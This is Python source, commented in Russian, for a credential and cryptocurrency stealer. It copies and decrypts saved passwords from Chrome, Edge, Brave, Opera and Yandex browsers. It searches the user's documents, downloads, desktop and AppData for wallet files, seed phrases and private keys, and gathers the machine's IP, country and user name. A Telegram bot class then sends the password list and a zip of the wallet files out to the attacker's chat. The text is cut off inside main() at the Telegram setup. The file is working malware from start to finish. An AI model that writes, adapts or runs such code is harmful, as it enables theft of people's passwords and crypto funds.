import os
import sqlite3
import win32crypt
import shutil
import json
import base64
import zipfile
import tempfile
import logging
import re
from pathlib import Path
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass
from contextlib import contextmanager
from Crypto.Cipher import AES
import requests
from datetime import datetime
import time
from threading import Thread
from concurrent.futures import ThreadPoolExecutor, as_completed

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('crypto_extractor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class BrowserCredential:
    """Класс для хранения учетных данных браузера"""
    browser: str
    url: str
    username: str
    password: str

@dataclass
class BrowserConfig:
    """Конфигурация браузера"""
    login_db: str
    local_state: str
    key_path: Optional[str] = None

@dataclass
class CryptoFile:
    """Класс для хранения информации о крипто-файле"""
    path: str
    reason: str
    confidence: int  # 1-10, где 10 - максимальная уверенность

class TelegramSender:
    """Класс для отправки данных в Telegram"""

    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.max_message_length = 4000
        self.max_file_size_mb = 45
        self.max_retries = 3
        self.retry_delay = 5

    def _send_request(self, method: str, data: dict = None, files: dict = None) -> bool:
        """Отправка запроса к Telegram API"""
        url = f"{self.base_url}/{method}"

        for attempt in range(self.max_retries):
            try:
                response = requests.post(url, data=data, files=files, timeout=60)
                if response.status_code == 200:
                    return True
                else:
                    logger.warning(f"Telegram API вернул код {response.status_code}: {response.text}")
            except Exception as e:
                logger.error(f"Ошибка отправки в Telegram (попытка {attempt + 1}): {e}")
                if attempt < self.max_retries - 1:
                    time.sleep(self.retry_delay)

        return False

    def send_message(self, message: str) -> bool:
        """Отправка текстового сообщения"""
        if not message.strip():
            return True

        # Разбивка длинных сообщений
        if len(message) > self.max_message_length:
            return self._send_long_message(message)

        data = {
            'chat_id': self.chat_id,
            'text': message,
            'disable_web_page_preview': True
        }

        return self._send_request('sendMessage', data)

    def _send_long_message(self, message: str) -> bool:
        """Отправка длинного сообщения по частям"""
        success = True
        for i in range(0, len(message), self.max_message_length):
            chunk = message[i:i + self.max_message_length]
            if not self.send_message(chunk):
                success = False
            time.sleep(1)  # Пауза между сообщениями
        return success

    def send_document(self, file_path: str, caption: str = None) -> bool:
        """Отправка документа"""
        if not os.path.exists(file_path):
            logger.error(f"Файл не найден: {file_path}")
            return False

        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > self.max_file_size_mb:
            logger.warning(f"Файл слишком большой ({file_size_mb:.2f} MB): {file_path}")
            return False

        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': self.chat_id}

                if caption:
                    data['caption'] = caption[:1000]  # Ограничение длины подписи

                return self._send_request('sendDocument', data, files)
        except Exception as e:
            logger.error(f"Ошибка отправки файла {file_path}: {e}")
            return False

    def send_chat_action(self, action: str = 'typing') -> bool:
        """Отправка действия в чат"""
        data = {
            'chat_id': self.chat_id,
            'action': action
        }
        return self._send_request('sendChatAction', data)

class CryptoFileAnalyzer:
    """Умный анализатор криптовалютных файлов"""

    def __init__(self):
        # Высокоприоритетные ключевые слова (максимальная уверенность)
        self.high_priority_keywords = {
            # Кошельки и криптовалюты
            'wallet', 'bitcoin', 'btc', 'ethereum', 'eth', 'litecoin', 'ltc',
            'dogecoin', 'doge', 'monero', 'xmr', 'ripple', 'xrp', 'cardano', 'ada',
            'binance', 'coinbase', 'kraken', 'bittrex', 'poloniex', 'huobi',

            # Seed фразы и приватные ключи
            'seed', 'mnemonic', 'private', 'privatekey', 'recovery', 'phrase',
            'words', '12words', '24words', 'backup',

            # Файлы кошельков
            'keystore', 'utc--', 'wallet.dat', 'electrum',

            # Крипто-сервисы
            'metamask', 'exodus', 'atomic', 'jaxx', 'myetherwallet', 'mew',
            'trustwallet', 'blockchain', 'coinomi'
        }

        # Среднеприоритетные ключевые слова
        self.medium_priority_keywords = {
            'crypto', 'cryptocurrency', 'coin', 'token', 'exchange', 'trading',
            'keys', 'address', 'hash', 'signature', 'cold', 'hot', 'hodl',
            'defi', 'nft', 'smart', 'contract', 'web3', 'dapp'
        }

        # Низкоприоритетные ключевые слова (только в контексте)
        self.low_priority_keywords = {
            'pass', 'password', 'login', 'account', 'secret', 'secure',
            'backup', 'export', 'import', 'transfer'
        }

        # Специфичные расширения файлов
        self.crypto_extensions = {
            '.dat': 8,      # wallet.dat
            '.json': 6,     # keystore файлы
            '.txt': 4,      # seed фразы
            '.key': 9,      # приватные ключи
            '.pem': 7,      # криптографические ключи
            '.p12': 8,      # PKCS#12 certificates
            '.pfx': 8,      # certificates
            '.keystore': 10, # Java keystore
            '.jks': 9,      # Java keystore
            '.wallet': 10   # wallet files
        }

        # Паттерны для поиска в содержимом файлов
        self.content_patterns = [
            # Bitcoin адреса
            (re.compile(r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'), 9, "Bitcoin адрес"),
            (re.compile(r'\bbc1[a-z0-9]{39,59}\b'), 9, "Bitcoin Bech32 адрес"),

            # Ethereum адреса
            (re.compile(r'\b0x[a-fA-F0-9]{40}\b'), 8, "Ethereum адрес"),

            # Приватные ключи (WIF формат)
            (re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b'), 10, "Bitcoin приватный ключ"),

            # Seed фразы (12 или 24 слова)
            (re.compile(r'\b(?:\w+\s+){11}\w+\b|\b(?:\w+\s+){23}\w+\b'), 9, "Возможная seed фраза"),

            # Hex ключи
            (re.compile(r'\b[a-fA-F0-9]{64}\b'), 7, "Hex ключ (256 бит)"),

            # JSON keystore структура
            (re.compile(r'"crypto"\s*:\s*{.*?"ciphertext"', re.DOTALL), 10, "Ethereum Keystore"),

            # Wallet.dat магические байты
            (re.compile(rb'\x62\x31\x05\x00'), 10, "wallet.dat файл")
        ]

        # Исключения - папки и файлы, которые точно не нужны
        self.exclude_dirs = {
            'node_modules', '.git', '.svn', '__pycache__', '.idea', '.vscode',
            'temp', 'tmp', 'cache', 'logs', 'log', 'backup', 'backups',
            'system32', 'windows', 'program files', 'program files (x86)',
            'appdata\\local\\temp', 'appdata\\locallow', 'cookies', 'history',
            'thumbnails', 'recent', 'recycle.bin', '$recycle.bin'
        }

        self.exclude_filenames = {
            'desktop.ini', 'thumbs.db', '.ds_store', 'pagefile.sys', 'hiberfil.sys',
            'swapfile.sys', 'config.sys', 'autoexec.bat'
        }

        # Минимальные размеры файлов по расширениям
        self.min_file_sizes = {
            '.txt': 10,      # минимум 10 байт для .txt
            '.json': 50,     # минимум 50 байт для .json
            '.dat': 100,     # минимум 100 байт для .dat
            '.key': 20,      # минимум 20 байт для .key
        }

        # Максимальные размеры (чтобы не захватывать огромные файлы)
        self.max_file_size = 50 * 1024 * 1024  # 50MB
        self.max_scan_size = 1 * 1024 * 1024   # Сканируем только первый 1MB файла

    def should_exclude_path(self, file_path: str) -> bool:
        """Проверка, нужно ли исключить путь из сканирования"""
        path_lower = file_path.lower()
        filename_lower = os.path.basename(file_path).lower()

        # Исключаем системные папки
        for exclude_dir in self.exclude_dirs:
            if exclude_dir in path_lower:
                return True

        # Исключаем системные файлы
        if filename_lower in self.exclude_filenames:
            return True

        # Исключаем слишком большие файлы
        try:
            if os.path.getsize(file_path) > self.max_file_size:
                return True
        except:
            return True

        return False

    def analyze_filename(self, file_path: str) -> Tuple[int, str]:
        """Анализ имени файла и пути"""
        filename = os.path.basename(file_path).lower()
        filepath_lower = file_path.lower()
        file_ext = os.path.splitext(filename)[1].lower()

        confidence = 0
        reasons = []

        # Проверка расширения
        if file_ext in self.crypto_extensions:
            ext_confidence = self.crypto_extensions[file_ext]
            confidence += ext_confidence
            reasons.append(f"Криптографическое расширение {file_ext} ({ext_confidence})")

        # Высокоприоритетные ключевые слова
        for keyword in self.high_priority_keywords:
            if keyword in filename or keyword in filepath_lower:
                confidence += 8
                reasons.append(f"Высокоприоритетное слово: {keyword}")
                break

        # Среднеприоритетные ключевые слова
        for keyword in self.medium_priority_keywords:
            if keyword in filename or keyword in filepath_lower:
                confidence += 4
                reasons.append(f"Среднеприоритетное слово: {keyword}")
                break

        # Низкоприоритетные ключевые слова (только в сочетании с другими)
        for keyword in self.low_priority_keywords:
            if keyword in filename:
                confidence += 1
                reasons.append(f"Низкоприоритетное слово: {keyword}")
                break

        # Специальные паттерны имен файлов
        special_patterns = {
            r'wallet\d*\.dat': (10, "Wallet.dat файл"),
            r'keystore.*': (9, "Keystore файл"),
            r'utc--.*': (10, "Ethereum keystore"),
            r'.*seed.*': (8, "Seed файл"),
            r'.*mnemonic.*': (9, "Mnemonic файл"),
            r'.*backup.*': (3, "Backup файл"),
            r'.*private.*key.*': (9, "Файл приватного ключа"),
            r'.*recovery.*': (7, "Recovery файл")
        }

        for pattern, (score, description) in special_patterns.items():
            if re.match(pattern, filename):
                confidence += score
                reasons.append(f"Паттерн: {description}")
                break

        return confidence, "; ".join(reasons)

    def analyze_file_content(self, file_path: str) -> Tuple[int, str]:
        """Анализ содержимого файла"""
        if self.should_exclude_path(file_path):
            return 0, "Исключен из анализа"

        try:
            file_size = os.path.getsize(file_path)
            file_ext = os.path.splitext(file_path)[1].lower()

            # Проверка минимального размера
            if file_ext in self.min_file_sizes:
                if file_size < self.min_file_sizes[file_ext]:
                    return 0, f"Файл слишком мал для {file_ext}"

            confidence = 0
            reasons = []

            # Читаем файл (только начало для больших файлов)
            read_size = min(file_size, self.max_scan_size)

            try:
                # Попытка прочитать как текст
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(read_size)

                # Проверка паттернов в тексте
                for pattern, score, description in self.content_patterns:
                    if isinstance(pattern.pattern, str):
                        matches = pattern.findall(content)
                        if matches:
                            confidence += score
                            reasons.append(f"Найден {description} ({len(matches)} совпадений)")

                # Дополнительные проверки для JSON файлов
                if file_ext == '.json':
                    try:
                        json_data = json.loads(content)
                        if self._analyze_json_content(json_data):
                            confidence += 8
                            reasons.append("JSON содержит криптографические данные")
                    except:
                        pass

            except UnicodeDecodeError:
                # Попытка прочитать как бинарный файл
                with open(file_path, 'rb') as f:
                    binary_content = f.read(read_size)

                    # Проверка бинарных паттернов
                    for pattern, score, description in self.content_patterns:
                        if isinstance(pattern.pattern, bytes):
                            if pattern.search(binary_content):
                                confidence += score
                                reasons.append(f"Найден {description}")

            return confidence, "; ".join(reasons)

        except Exception as e:
            logger.debug(f"Ошибка анализа содержимого {file_path}: {e}")
            return 0, f"Ошибка чтения: {str(e)}"

    def _analyze_json_content(self, json_data: dict) -> bool:
        """Анализ JSON содержимого на предмет криптографических данных"""
        if not isinstance(json_data, dict):
            return False

        # Проверка структуры Ethereum keystore
        keystore_keys = {'crypto', 'ciphertext', 'cipher', 'kdf', 'address'}
        if any(key in json_data for key in keystore_keys):
            return True

        # Проверка других криптографических структур
        crypto_keys = {'privateKey', 'publicKey', 'mnemonic', 'seed', 'entropy'}
        if any(key in str(json_data).lower() for key in crypto_keys):
            return True

        return False

    def analyze_file(self, file_path: str) -> Optional[CryptoFile]:
        """Полный анализ файла"""
        filename_confidence, filename_reason = self.analyze_filename(file_path)
        content_confidence, content_reason = self.analyze_file_content(file_path)

        total_confidence = filename_confidence + content_confidence

        # Минимальный порог уверенности
        min_confidence = 5

        if total_confidence >= min_confidence:
            combined_reason = []
            if filename_reason:
                combined_reason.append(f"Имя: {filename_reason}")
            if content_reason and content_reason != "Исключен из анализа":
                combined_reason.append(f"Содержимое: {content_reason}")

            return CryptoFile(
                path=file_path,
                reason=" | ".join(combined_reason),
                confidence=min(total_confidence, 10)  # Ограничиваем максимум 10
            )

        return None

class CryptoDataExtractor:
    """Основной класс для извлечения криптовалютных данных"""

    MAX_RETRIES = 3
    RETRY_DELAY = 1

    def __init__(self, telegram_sender: Optional[TelegramSender] = None):
        self.browsers = self._get_browser_configs()
        self.temp_dir = tempfile.mkdtemp(prefix='crypto_extractor_')
        self.telegram = telegram_sender
        self.crypto_analyzer = CryptoFileAnalyzer()

    def _get_yandex_profiles(self) -> List[Tuple[str, BrowserConfig]]:
        """Получение всех профилей Яндекс браузера"""
        profiles = []
        localappdata = os.environ.get('LOCALAPPDATA', '')
        yandex_user_data = os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data')

        if not os.path.exists(yandex_user_data):
            return profiles

        try:
            # Основной профиль (Default)
            default_profile = BrowserConfig(
                login_db=os.path.join(yandex_user_data, 'Default', 'Login Data'),
                local_state=os.path.join(yandex_user_data, 'Local State')
            )
            if os.path.exists(default_profile.login_db):
                profiles.append(('Yandex_Default', default_profile))

            # Дополнительные профили (Profile 1, Profile 2, etc.)
            for item in os.listdir(yandex_user_data):
                if item.startswith('Profile '):
                    profile_path = os.path.join(yandex_user_data, item)
                    login_db_path = os.path.join(profile_path, 'Login Data')

                    if os.path.exists(login_db_path):
                        profile_config = BrowserConfig(
                            login_db=login_db_path,
                            local_state=os.path.join(yandex_user_data, 'Local State')
                        )
                        profiles.append((f'Yandex_{item}', profile_config))

        except Exception as e:
            logger.error(f"Ошибка получения профилей Яндекс браузера: {e}")

        return profiles

    def _get_browser_configs(self) -> Dict[str, BrowserConfig]:
        """Получение конфигураций браузеров с поддержкой множественных профилей"""
        localappdata = os.environ.get('LOCALAPPDATA', '')
        appdata = os.environ.get('APPDATA', '')

        configs = {
            "Chrome": BrowserConfig(
                login_db=os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
                local_state=os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Local State')
            ),
            "Edge": BrowserConfig(
                login_db=os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
                local_state=os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Local State'),
                key_path=os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data')
            ),
            "Brave": BrowserConfig(
                login_db=os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
                local_state=os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State')
            ),
            "Opera": BrowserConfig(
                login_db=os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Login Data'),
                local_state=os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Local State')
            ),
            "Firefox": BrowserConfig(
                login_db=os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
                local_state=""  # Firefox использует другую систему
            )
        }

        # Добавление профилей Яндекс браузера
        yandex_profiles = self._get_yandex_profiles()
        for profile_name, profile_config in yandex_profiles:
            configs[profile_name] = profile_config

        # Если профили не найдены, добавляем стандартную конфигурацию
        if not any(name.startswith('Yandex') for name in configs.keys()):
            configs["Yandex"] = BrowserConfig(
                login_db=os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data'),
                local_state=os.path.join(localappdata, 'Yandex', 'YandexBrowser', 'User Data', 'Local State')
            )

        return configs

    @contextmanager
    def _safe_database_connection(self, db_path: str):
        """Безопасное подключение к базе данных"""
        conn = None
        try:
            conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True, timeout=10.0)
            yield conn
        except sqlite3.Error as e:
            logger.error(f"Ошибка подключения к БД {db_path}: {e}")
            yield None
        finally:
            if conn:
                conn.close()

    def _get_encryption_key(self, browser_path: str) -> Optional[bytes]:
        """Получение ключа шифрования браузера"""
        try:
            local_state_path = Path(browser_path) / "Local State"
            if not local_state_path.exists():
                logger.warning(f"Local State не найден: {local_state_path}")
                return None

            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
            logger.info(f"Ключ шифрования получен для {browser_path}")
            return decrypted_key

        except Exception as e:
            logger.error(f"Ошибка получения ключа шифрования для {browser_path}: {e}")
            return None

    def _decrypt_password(self, password: bytes, key: Optional[bytes]) -> Optional[str]:
        """Расшифровка пароля"""
        if not password:
            return None

        try:
            # Новый формат Chrome (v10/v11)
            if password.startswith(b'v10') or password.startswith(b'v11'):
                if not key:
                    return None
                iv = password[3:15]
                payload = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8')

            # Старый формат Windows DPAPI
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode('utf-8')

        except Exception as e:
            logger.debug(f"Не удалось расшифровать пароль: {e}")
            return None

    def _copy_database_safely(self, source: str, destination: str) -> bool:
        """Безопасное копирование базы данных с повторными попытками"""
        for attempt in range(self.MAX_RETRIES):
            try:
                shutil.copy2(source, destination)
                return True
            except Exception as e:
                logger.warning(f"Попытка {attempt + 1} копирования {source} не удалась: {e}")
                if attempt < self.MAX_RETRIES - 1:
                    time.sleep(self.RETRY_DELAY)
        return False

    def _extract_browser_data(self, browser_name: str, config: BrowserConfig) -> List[BrowserCredential]:
        """Извлечение данных из конкретного браузера"""
        credentials = []

        if not os.path.exists(config.login_db) or not os.path.exists(config.local_state):
            logger.info(f"Файлы браузера {browser_name} не найдены")
            return credentials

        # Создание временной копии базы данных
        temp_db = os.path.join(self.temp_dir, f"{browser_name}_temp.db")
        if not self._copy_database_safely(config.login_db, temp_db):
            logger.error(f"Не удалось скопировать БД для {browser_name}")
            return credentials

        try:
            # Получение ключа шифрования
            key_path = config.key_path or os.path.dirname(config.local_state)
            key = self._get_encryption_key(key_path)

            # Подключение к базе данных и извлечение паролей
            with self._safe_database_connection(temp_db) as conn:
                if not conn:
                    return credentials

                cursor = conn.cursor()

                # Попытка с разными схемами БД
                queries = [
                    "SELECT origin_url, username_value, password_value FROM logins",
                    "SELECT action_url, username_value, password_value FROM logins"
                ]

                for query in queries:
                    try:
                        cursor.execute(query)
                        results = cursor.fetchall()
                        break
                    except sqlite3.Error:
                        continue
                else:
                    logger.error(f"Не удалось выполнить запрос для {browser_name}")
                    return credentials

                for url, username, password in results:
                    if not password or not username:
                        continue

                    decrypted = self._decrypt_password(password, key)
                    if decrypted:
                        credentials.append(BrowserCredential(
                            browser=browser_name,
                            url=url,
                            username=username,
                            password=decrypted
                        ))

            logger.info(f"Извлечено {len(credentials)} паролей из {browser_name}")

        except Exception as e:
            logger.error(f"Ошибка извлечения данных из {browser_name}: {e}")

        finally:
            # Очистка временного файла
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception as e:
                    logger.warning(f"Не удалось удалить временный файл {temp_db}: {e}")

        return credentials

    def get_browser_data(self) -> List[BrowserCredential]:
        """Получение данных из всех браузеров с многопоточностью"""
        all_credentials = []

        with ThreadPoolExecutor(max_workers=4) as executor:
            future_to_browser = {
                executor.submit(self._extract_browser_data, name, config): name 
                for name, config in self.browsers.items()
            }

            for future in as_completed(future_to_browser):
                browser_name = future_to_browser[future]
                try:
                    credentials = future.result(timeout=30)
                    all_credentials.extend(credentials)
                except Exception as e:
                    logger.error(f"Ошибка обработки браузера {browser_name}: {e}")

        logger.info(f"Всего извлечено {len(all_credentials)} учетных записей")
        return all_credentials

    def find_crypto_files(self) -> List[CryptoFile]:
        """Умный поиск криптовалютных файлов"""
        found_files = []
        userprofile = os.environ.get('USERPROFILE', '')

        # Приоритетные папки для сканирования
        priority_folders = [
            os.path.join(userprofile, 'Documents'),
            os.path.join(userprofile, 'Downloads'),
            os.path.join(userprofile, 'Desktop'),
        ]

        # Дополнительные папки (сканируем, но с меньшим приоритетом)
        additional_folders = [
            os.path.join(userprofile, 'AppData', 'Roaming'),
            os.path.join(userprofile, 'AppData', 'Local'),
        ]

        def scan_folder_smart(folder_path: str, is_priority: bool = True) -> List[CryptoFile]:
            """Умное сканирование папки"""
            files_in_folder = []
            try:
                if not os.path.exists(folder_path):
                    return files_in_folder

                scan_count = 0
                max_scan_files = 10000 if is_priority else 5000  # Ограничиваем количество файлов

                for root, dirs, files in os.walk(folder_path):
                    # Фильтруем исключаемые директории
                    dirs[:] = [d for d in dirs if not any(
                        exclude in os.path.join(root, d).lower() 
                        for exclude in self.crypto_analyzer.exclude_dirs
                    )]

                    for file in files:
                        scan_count += 1
                        if scan_count > max_scan_files:
                            logger.info(f"Достигнут лимит сканирования для {folder_path}")
                            break

                        try:
                            file_path = os.path.join(root, file)

                            # Быстрая предварительная проверка
                            if self.crypto_analyzer.should_exclude_path(file_path):
                                continue

                            # Полный анализ файла
                            crypto_file = self.crypto_analyzer.analyze_file(file_path)
                            if crypto_file:
                                files_in_folder.append(crypto_file)
                                logger.debug(f"Найден крипто-файл: {file_path} (уверенность: {crypto_file.confidence})")

                        except Exception as e:
                            logger.debug(f"Ошибка анализа файла {file}: {e}")
                            continue

                    if scan_count > max_scan_files:
                        break

            except Exception as e:
                logger.error(f"Ошибка сканирования папки {folder_path}: {e}")

            return files_in_folder

        # Сканирование приоритетных папок
        logger.info("Сканирование приоритетных папок...")
        with ThreadPoolExecutor(max_workers=2) as executor:
            future_to_folder = {
                executor.submit(scan_folder_smart, folder, True): folder 
                for folder in priority_folders
            }

            for future in as_completed(future_to_folder):
                folder = future_to_folder[future]
                try:
                    files = future.result(timeout=300)  # 5 минут на папку
                    found_files.extend(files)
                    logger.info(f"В приоритетной папке {folder} найдено {len(files)} крипто-файлов")
                except Exception as e:
                    logger.error(f"Ошибка сканирования приоритетной папки {folder}: {e}")

        # Сканирование дополнительных папок (только если найдено мало файлов)
        if len(found_files) < 5:
            logger.info("Сканирование дополнительных папок...")
            with ThreadPoolExecutor(max_workers=1) as executor:
                future_to_folder = {
                    executor.submit(scan_folder_smart, folder, False): folder 
                    for folder in additional_folders
                }

                for future in as_completed(future_to_folder):
                    folder = future_to_folder[future]
                    try:
                        files = future.result(timeout=600)  # 10 минут на папку
                        found_files.extend(files)
                        logger.info(f"В дополнительной папке {folder} найдено {len(files)} крипто-файлов")
                    except Exception as e:
                        logger.error(f"Ошибка сканирования дополнительной папки {folder}: {e}")

        # Сортировка по уверенности (убывание)
        found_files.sort(key=lambda x: x.confidence, reverse=True)

        # Ограничиваем количество файлов (берем только самые уверенные)
        max_files = 100
        if len(found_files) > max_files:
            logger.info(f"Ограничиваем результат до {max_files} самых вероятных файлов")
            found_files = found_files[:max_files]

        logger.info(f"Всего найдено {len(found_files)} высококачественных крипто-файлов")
        return found_files

    def get_system_info(self) -> str:
        """Получение информации о системе"""
        try:
            # Получение IP адреса
            ip_response = requests.get('https://api.ipify.org', timeout=10)
            ip = ip_response.text if ip_response.status_code == 200 else 'Unknown'

            # Получение страны
            country = 'Unknown'
            if ip != 'Unknown':
                country_response = requests.get(
                    f'http://ip-api.com/json/{ip}?fields=country', 
                    timeout=10
                )
                if country_response.status_code == 200:
                    country_data = country_response.json()
                    country = country_data.get('country', 'Unknown')

            username = os.getlogin()
            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')

            return (
                f"🔍 === ИНФОРМАЦИЯ О СИСТЕМЕ ===\n"
                f"📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"👤 Пользователь: {username}\n"
                f"💻 Компьютер: {computer_name}\n"
                f"🌐 IP адрес: {ip}\n"
                f"🏴 Страна: {country}"
            )

        except Exception as e:
            logger.error(f"Ошибка получения системной информации: {e}")
            return (
                f"🔍 === ИНФОРМАЦИЯ О СИСТЕМЕ ===\n"
                f"📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"❌ Ошибка получения данных: {str(e)}"
            )

    def create_passwords_file(self, browser_data: List[BrowserCredential]) -> Optional[str]:
        """Создание .txt файла с паролями"""
        if not browser_data:
            return None

        passwords_file = os.path.join(self.temp_dir, 'passwords.txt')

        try:
            with open(passwords_file, 'w', encoding='utf-8') as f:
                f.write(self.get_system_info() + "\n\n")
                f.write("🔐 === ДАННЫЕ БРАУЗЕРОВ ===\n\n")

                for i, cred in enumerate(browser_data, 1):
                    f.write(f"{i}. 🌐 Браузер: {cred.browser}\n")
                    f.write(f"   🔗 URL: {cred.url}\n")
                    f.write(f"   👤 Логин: {cred.username}\n")
                    f.write(f"   🔑 Пароль: {cred.password}\n")
                    f.write(f"   {'-'*50}\n\n")

            logger.info(f"Создан файл с паролями: {passwords_file}")
            return passwords_file

        except Exception as e:
            logger.error(f"Ошибка создания файла с паролями: {e}")
            return None

    def create_files_archive(self, crypto_files: List[CryptoFile]) -> Optional[str]:
        """Создание zip архива с найденными файлами"""
        if not crypto_files:
            return None

        files_archive = os.path.join(self.temp_dir, 'crypto_files.zip')

        try:
            with zipfile.ZipFile(files_archive, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
                # Добавляем файл с описанием найденных файлов
                report_content = "НАЙДЕННЫЕ КРИПТОВАЛЮТНЫЕ ФАЙЛЫ\n" + "="*50 + "\n\n"
                for i, crypto_file in enumerate(crypto_files, 1):
                    report_content += f"{i}. Файл: {crypto_file.path}\n"
                    report_content += f"   Причина: {crypto_file.reason}\n"
                    report_content += f"   Уверенность: {crypto_file.confidence}/10\n\n"

                zipf.writestr('ФАЙЛЫ_ОПИСАНИЕ.txt', report_content.encode('utf-8'))

                # Добавляем сами файлы
                added_count = 0
                for crypto_file in crypto_files:
                    try:
                        if os.path.exists(crypto_file.path):
                            file_size = os.path.getsize(crypto_file.path)
                            if file_size <= self.crypto_analyzer.max_file_size:
                                # Создание структуры папок в архиве
                                relative_path = os.path.relpath(crypto_file.path, os.environ.get('USERPROFILE', ''))
                                # Добавляем префикс с уверенностью для сортировки
                                archive_name = f"confidence_{crypto_file.confidence:02d}/{relative_path}"
                                zipf.write(crypto_file.path, archive_name)
                                added_count += 1
                    except Exception as e:
                        logger.warning(f"Не удалось добавить файл {crypto_file.path} в архив: {e}")

            archive_size = os.path.getsize(files_archive) / (1024 * 1024)  # MB
            logger.info(f"Создан архив с {added_count} файлами, размер {archive_size:.2f} MB: {files_archive}")
            return files_archive

        except Exception as e:
            logger.error(f"Ошибка создания архива с файлами: {e}")
            return None

    def send_data_to_telegram(self, browser_data: List[BrowserCredential], crypto_files: List[CryptoFile]):
        """Отправка данных в Telegram"""
        if not self.telegram:
            logger.info("Отправка в Telegram отключена")
            return

        # Отправка системной информации
        system_info = self.get_system_info()
        self.telegram.send_message(system_info)

        # Создание и отправка файла с паролями
        if browser_data:
            passwords_file = self.create_passwords_file(browser_data)
            if passwords_file:
                file_size = os.path.getsize(passwords_file) / (1024 * 1024)
                caption = f"🔑 Пароли из браузеров\n📊 Найдено: {len(browser_data)} записей\n💾 Размер: {file_size:.2f} MB"

                self.telegram.send_chat_action('upload_document')
                if self.telegram.send_document(passwords_file, caption):
                    logger.info("Файл с паролями успешно отправлен")
                else:
                    logger.error("Не удалось отправить файл с паролями")
                    self.telegram.send_message(f"❌ Не удалось отправить файл с паролями ({len(browser_data)} записей)")
            else:
                self.telegram.send_message(f"❌ Не удалось создать файл с паролями ({len(browser_data)} записей)")
        else:
            self.telegram.send_message("❌ Пароли в браузерах не найдены")

        # Создание и отправка архива с файлами
        if crypto_files:
            # Отправка краткой статистики
            high_confidence = len([f for f in crypto_files if f.confidence >= 8])
            medium_confidence = len([f for f in crypto_files if 5 <= f.confidence < 8])

            stats_msg = (f"📁 Найдено {len(crypto_files)} криптовалютных файлов:\n"
                        f"🔥 Высокая уверенность: {high_confidence}\n"
                        f"🟡 Средняя уверенность: {medium_confidence}")
            self.telegram.send_message(stats_msg)

            files_archive = self.create_files_archive(crypto_files)
            if files_archive:
                archive_size = os.path.getsize(files_archive) / (1024 * 1024)

                if archive_size <= self.telegram.max_file_size_mb:
                    caption = f"📁 Криптовалютные файлы\n📊 Файлов: {len(crypto_files)}\n💾 Размер: {archive_size:.2f} MB"

                    self.telegram.send_chat_action('upload_document')
                    if self.telegram.send_document(files_archive, caption):
                        logger.info("Архив с файлами успешно отправлен")
                    else:
                        logger.error("Не удалось отправить архив с файлами")
                        self._send_files_list(crypto_files)
                else:
                    self.telegram.send_message(f"❌ Архив слишком большой ({archive_size:.2f} MB)")
                    self._send_files_list(crypto_files)
            else:
                self.telegram.send_message(f"❌ Не удалось создать архив с файлами")
                self._send_files_list(crypto_files)
        else:
            self.telegram.send_message("❌ Криптовалютные файлы не найдены")

    def _send_files_list(self, crypto_files: List[CryptoFile]):
        """Отправка списка файлов как текст"""
        if not self.telegram or not crypto_files:
            return

        # Отправляем только самые важные файлы
        high_priority_files = [f for f in crypto_files if f.confidence >= 7]
        if not high_priority_files:
            high_priority_files = crypto_files[:20]  # Первые 20 файлов

        message = "📁 === ТОП КРИПТОВАЛЮТНЫЕ ФАЙЛЫ ===\n\n"
        for i, crypto_file in enumerate(high_priority_files[:15], 1):  # Максимум 15 файлов
            entry = (f"{i}. 📄 {os.path.basename(crypto_file.path)}\n"
                    f"   📍 {crypto_file.path}\n"
                    f"   ⭐ Уверенность: {crypto_file.confidence}/10\n"
                    f"   💡 {crypto_file.reason}\n\n")

            if len(message + entry) > 3500:
                self.telegram.send_message(message)
                message = f"📁 === ФАЙЛЫ (продолжение) ===\n\n{entry}"
                time.sleep(1)
            else:
                message += entry

        if message.strip():
            self.telegram.send_message(message)

    def cleanup(self):
        """Очистка временных файлов"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            logger.info("Временные файлы очищены")
        except Exception as e:
            logger.warning(f"Ошибка очистки временных файлов: {e}")

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()

def main():
    """Главная функция"""
    # Конфигурация Telegram (замените на свои данные)
